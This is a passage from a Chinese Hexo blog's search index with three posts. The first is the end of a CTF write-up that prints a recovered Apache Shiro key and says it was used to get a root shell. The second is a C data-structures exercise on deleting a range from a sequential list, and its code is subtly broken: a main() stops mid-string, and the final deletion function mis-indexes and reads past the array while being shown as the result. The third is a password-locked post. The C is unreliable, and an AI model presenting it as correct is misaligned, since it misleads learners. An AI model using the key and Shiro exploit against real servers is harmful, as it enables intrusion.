)))</span><br></pre></td></tr></table></figure><p>run一下<br><img src="https://s2.loli.net/2023/03/09/1LngBOHeG82XPlQ.png" alt="image-20230309130141904.png"><br>成功得到key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xYPI3FvXah6vrtpjw256qg==</span><br></pre></td></tr></table></figure><p>shiroEXP利用，getshellroot权限  快乐~  done 今天吃啥好呢？？<br><img src="https://s2.loli.net/2023/03/09/z8qpKRXwWhU93JB.png" alt="image-20230309130525397.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-完成缺失代码题目</title>
      <link href="/2023/03/08/%E5%AE%8C%E6%88%90%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%BB%A3%E7%A0%81%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/03/08/%E5%AE%8C%E6%88%90%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%BB%A3%E7%A0%81%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="线性表的顺序存储表示（结构）"><a href="#线性表的顺序存储表示（结构）" class="headerlink" title="线性表的顺序存储表示（结构）"></a>线性表的顺序存储表示（结构）</h2><p>完成以下缺失代码：<br>阅读下列程序请注意几个问题：<br>（1）关于线性表的顺序存储结构的本质是：在逻辑上相邻的两个数据元素 a(i-1)， a(i), 在存储地址中也是相邻的，既地址连续。顺序存储结构也称 “向量(vector)”。在下列类设计中，采用静态一维数组 data[]表示向量，同时用Maxsize表示顺序表的最大容量，length表示线性表当前所存放的元素个数。<br>ElemType data [MaxSize];<br>int length;</p><p>(2)在上机实验时，需要一段主函数 main()，在主函数中调用顺序表中定义的各个基本操作〔函数），以便将一个典型数据结构运用到实际问题中去。<br>在没有学习可视化图形界面之前，在主函数中简单设计一个”菜单” (do-while循环内联套一个 switch 结构)。随着学习的深入，应该学会熱练使用 “菜单”技术，这样会明显提高编程和运行效率。</p><h2 id="修改程序题目"><a href="#修改程序题目" class="headerlink" title="修改程序题目"></a>修改程序题目</h2><p>（1）参照以下代码(线性表的顺序存储结构实现了对若干个整型数据的基本操作)，为该顺序表增加一个函数 void DelElem_iToj(SqList *L,int i ,int j)：删除从第i个位置到第j个位置范围内的元素。例如，该顺序表中当前内容如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">2</span>    | <span class="number">5</span>    | <span class="number">4</span>    | <span class="number">1</span>    | <span class="number">9</span>    |</span><br><span class="line">| <span class="comment">---- | ---- | ---- | ---- | ---- |</span></span><br></pre></td></tr></table></figure><p>删除从第2个位置到第4个位置范围内的元素后，如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">2</span>    | <span class="number">9</span>    |      |      |      |</span><br><span class="line">| <span class="comment">---- | ---- | ---- | ---- | ---- |</span></span><br></pre></td></tr></table></figure><p>补全缺失代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ElemType data[MaxSize];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125; SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList *L)</span> &#123;</span><br><span class="line">    L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(SqList L)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> L.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i, ElemType *e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *e = L.data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList L, ElemType e)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (L.data[i] == e) &#123;</span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListInsert</span><span class="params">(SqList *L, <span class="type">int</span> i, ElemType e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length+<span class="number">1</span> || L-&gt;length == MaxSize) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L-&gt;length<span class="number">-1</span>; j &gt;= i<span class="number">-1</span>; j--) &#123;</span><br><span class="line">        L-&gt;data[j+<span class="number">1</span>] = L-&gt;data[j];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>] = e;</span><br><span class="line">    L-&gt;length++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ListDelete</span><span class="params">(SqList *L, <span class="type">int</span> i, ElemType *e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || i &gt; L-&gt;length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *e = L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; L-&gt;length; j++) &#123;</span><br><span class="line">        L-&gt;data[j<span class="number">-1</span>] = L-&gt;data[j];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length--;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为该顺序表增加一个函数 <code>void DelElem_iToj(SqList *L, int i, int j)</code>，其实现步骤如下：</p><ol><li>判断删除范围是否合法，即 $1\leq i\leq j\leq L-&gt;length$；</li><li>将第 $j+1$ 个元素及其之后的所有元素向前移动 $j-i+1$ 个位置；</li><li>将删除的元素个数 $j-i+1$ 从线性表长度中减去。</li></ol><p>修改后的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelElem_iToj</span><span class="params">(SqList *L, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || j &gt; L-&gt;length || i &gt; j) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">for</span> (k = j+<span class="number">1</span>; k &lt;= L-&gt;length; k++) &#123;</span><br><span class="line">        L-&gt;data[k-(j-i+<span class="number">1</span>)] = L-&gt;data[k<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length -= (j-i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一个简单的主函数 <code>main</code>，实现了顺序表的基本操作和 <code>DelElem_iToj</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    InitList(&amp;L);</span><br><span class="line">    ListInsert(&amp;L, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    ListInsert(&amp;L, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    ListInsert(&amp;L, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    ListInsert(&amp;L, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">    ListInsert(&amp;L, <span class="number">5</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Original list:\n);</span></span><br></pre></td></tr></table></figure><p>最终编译运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100  <span class="comment">// 定义线性表的最大长度为100</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType; <span class="comment">// 定义元素类型为int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ElemType data[MaxSize]; <span class="comment">// 存放线性表元素的静态数组</span></span><br><span class="line">    <span class="type">int</span> length; <span class="comment">// 线性表的当前长度</span></span><br><span class="line">&#125; SqList; <span class="comment">// 顺序表的类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DelElem_iToj</span><span class="params">(SqList *L, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span> || j &gt; L-&gt;length || i &gt;= j) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除位置不合法\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">for</span> (k = i; k &lt;= L-&gt;length - (j - i + <span class="number">1</span>); k++) &#123;</span><br><span class="line">        L-&gt;data[k] = L-&gt;data[k + (j - i + <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;length -= j - i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    L.length = <span class="number">5</span>;</span><br><span class="line">    L.data[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    L.data[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">    L.data[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">    L.data[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">    L.data[<span class="number">4</span>] = <span class="number">9</span>;</span><br><span class="line">    DelElem_iToj(&amp;L, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：<br><img src="https://s2.loli.net/2023/03/07/JiweBXbSKsZRNz4.png" alt="image-20230307112403365.png"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + github 搭建博客</title>
      <link href="/2023/03/05/Hexo%20+%20github%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/03/05/Hexo%20+%20github%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="94ec83c5958d62535990cd54478d3f37f15b9174dba6661cb88f18f8c5c254b4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> blog杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
